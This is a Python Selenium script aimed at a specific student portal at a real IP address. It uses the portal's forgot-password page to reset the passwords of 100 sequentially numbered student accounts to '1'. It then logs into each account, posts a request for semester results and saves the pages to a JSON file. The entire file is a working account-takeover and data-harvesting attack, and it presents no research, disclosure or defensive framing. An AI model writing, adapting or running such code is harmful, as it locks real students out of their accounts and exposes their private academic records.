import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import threading

# Configuration
portal_url = "http://202.168.87.90/StudentPortal/"
password_reset_url = portal_url + "ForgetPassword.aspx"
login_url = portal_url + "Login.aspx"
data_url = portal_url + "default.aspx"
username_prefix = "2022UGEC"
password = "1"
username_range = range(1, 101)  # 001 to 100

# Selenium Setup
driver_path = "C:\\Users\\HP Laptop\\Downloads\\chromedriver-win64\\chromedriver-win64\\chromedriver.exe"

options = webdriver.ChromeOptions()
options.add_argument("--headless")  # Run browser in headless mode for automation
options.add_argument("--disable-gpu")

# Thread-safe storage for results
all_data = {}
lock = threading.Lock()

# Function to change passwords
def change_password(username):
    driver = webdriver.Chrome(service=Service(driver_path), options=options)
    wait = WebDriverWait(driver, 10)
    try:
        driver.get(password_reset_url)
        wait.until(EC.presence_of_element_located((By.ID, "txt_username")))

        driver.find_element(By.ID, "txt_username").send_keys(username)
        driver.find_element(By.ID, "txtnewpass").send_keys(password)
        driver.find_element(By.ID, "txtConfirmpass").send_keys(password)
        driver.find_element(By.ID, "btnSubmit").click()

        try:
            WebDriverWait(driver, 5).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            print(f"Password change alert for {username}: {alert.text}")
            alert.accept()
        except Exception:
            pass
    finally:
        driver.quit()

# Function to fetch student data
def fetch_student_data(username):
    driver = webdriver.Chrome(service=Service(driver_path), options=options)
    wait = WebDriverWait(driver, 10)
    try:
        driver.get(login_url)
        wait.until(EC.presence_of_element_located((By.ID, "txt_username")))

        driver.find_element(By.ID, "txt_username").send_keys(username)
        driver.find_element(By.ID, "txt_password").send_keys(password)
        driver.find_element(By.ID, "btnSubmit").click()

        driver.get(data_url)
        wait.until(EC.presence_of_element_located((By.NAME, "__VIEWSTATE")))

        viewstate = driver.find_element(By.NAME, "__VIEWSTATE").get_attribute("value")
        hfidno = driver.find_element(By.NAME, "hfIdno").get_attribute("value")

        payload = {
            "__VIEWSTATE": viewstate,
            "ddlSemester": "5",
            "hfIdno": hfidno,
            "btnimgShowResult.x": "51",
            "btnimgShowResult.y": "2",
            "hdfidno": hfidno,
        }

        cookies = driver.get_cookies()
        session = requests.Session()
        for cookie in cookies:
            session.cookies.set(cookie['name'], cookie['value'])

        response = session.post(data_url, data=payload)

        # Store the result in a thread-safe way
        with lock:
            all_data[username] = response.text

        print(f"Data fetched for {username}")
    finally:
        driver.quit()

# Main Automation Loop
with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust max_workers as needed
    # Concurrently change passwords
    change_password_futures = [executor.submit(change_password, f"{username_prefix}{i:03}") for i in username_range]
    for future in as_completed(change_password_futures):
        future.result()  # Wait for all password changes to complete

    # Concurrently fetch data
    fetch_data_futures = [executor.submit(fetch_student_data, f"{username_prefix}{i:03}") for i in username_range]
    for future in as_completed(fetch_data_futures):
        future.result()  # Wait for all data fetching to complete

# Save all collected data
with open("student_data.json", "w") as file:
    json.dump(all_data, file)

print("Data collection complete. Saved to student_data.json")
